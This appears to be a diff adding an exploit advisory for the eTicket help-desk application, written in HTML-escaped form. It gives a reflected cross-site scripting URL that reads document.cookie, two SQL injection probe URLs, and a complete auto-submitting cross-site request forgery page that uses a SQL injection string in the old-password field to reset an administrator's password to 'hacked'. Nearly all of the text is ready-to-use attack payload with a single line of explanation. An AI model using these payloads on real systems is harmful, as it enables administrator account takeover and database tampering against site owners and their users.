@@ -1,0 +1,26 @@
+http://www.example.com/eTicket/view.php?s=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+http://www.example.com/eTicket/admin.php?a=headers&amp;msg=SQL&#039;
+
+http://www.example.com/eTicket/search.php?s=advanced&amp;text=test&amp;cat=&amp;status=open&#039;SQL&amp;search_submit=Search
+
+By visiting a page containing the following code, the password of a
+logged in administrator will be set to &quot;hacked&quot;.
+
+&lt;html&gt;
+&lt;body&gt;
+&lt;form id=&quot;csrf&quot; name=&quot;csrf&quot;
+action=&quot;http://www.example.com/eTicket/admin.php?a=my&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;a&quot; value=&quot;my&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;admin&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;text&quot; name=&quot;email&quot; value=&quot;mail@example.com&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;&#039;) OR (&#039;1&#039;=&#039;1&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;password&quot; name=&quot;npassword&quot; value=&quot;hacked&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;password&quot; name=&quot;vpassword&quot; value=&quot;hacked&quot;&gt;&lt;br&gt;
+&lt;textarea name=&quot;sig&quot; cols=&quot;30&quot; rows=&quot;5&quot;&gt;&lt;/textarea&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Save Changes&quot;&gt;&lt;br&gt;
+&lt;/form&gt;
+&lt;script language=&quot;JavaScript&quot;&gt;document.getElementById(&#039;csrf&#039;).submit.click()&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
